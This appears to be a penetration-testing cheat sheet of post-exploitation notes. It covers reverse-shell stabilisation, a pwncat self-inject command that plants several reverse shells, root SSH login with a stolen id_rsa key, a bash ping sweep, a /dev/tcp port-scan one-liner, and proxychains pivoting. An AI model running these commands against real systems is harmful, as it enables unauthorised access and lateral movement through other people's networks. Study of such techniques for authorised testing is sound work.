#### Shell Stabilization
`We can use terminal commands like clear that is important after getting reverse shell.`

```export TERM=xterm```

##### Check available languages installed in System like python, perl, etc to get a better shell.

#### Backgrounding and Foregrounding Shell
```
Background CTRL+Z
Foreground : stty raw -echo; fg 
```

#### Pwncat

```
usage : pwncat -l 2000

Self-Inject Shell
pwncat -l 1234 --self-inject /bin/sh:192.168.0.3:1234
```
![Screenshot at 2022-12-19 11-47-20](https://user-images.githubusercontent.com/85208639/208359602-1d7531c9-5f7e-469a-802d-c3ee4c011e6a.png)

#### Connect Multiple Reverse Shells with Clients

```
pwncat -l 1234 --self-inject /bin/sh:192.168.0.3:1234+3
The above command creates 4 reverse shells on the machines at port 1235,1236,1237,1234

```

Sometimes we may gain remote machine ssh secret utilizing it we may be able to get access to it.

```
1) Download the id_rsa to local machine.
2) chmod 600 id_rsa
3) ssh -i id_rsa root@192.169.0.3
```
#### Enumeration:
> There are various ways to enumerate other machines in a network


>Using tools avalable on system like using arp -a command.


>Checking /etc/hosts filein linux or C:\Windows\System32\drivers\etc\hosts file in Windows.


>Using local tools through proxy.

##### Enumerate live machines in a host 
```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

![Screenshot at 2022-12-19 13-01-33](https://user-images.githubusercontent.com/85208639/208370241-ce5cabbc-3141-4239-9065-2ed4b6ea1c3f.png)




#### Pivoting Techniques
| Tunneling | Port Forwarding |
| --- | ---|
|Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network|Creating a connection between local port and single port on target|
|Reliable if we want to perform nmap scan on other machine or send large amount of traffic.|Reliable but only single port can be accessed at a time.|

##### ProxyChains
>Default ProxyChain Directory
```
/etc/proxychains.conf
```

While using proxychains with nmap comment the following lines 

```

# Proxy DNS requests - no leak for DNS data
#proxy_dns 

```
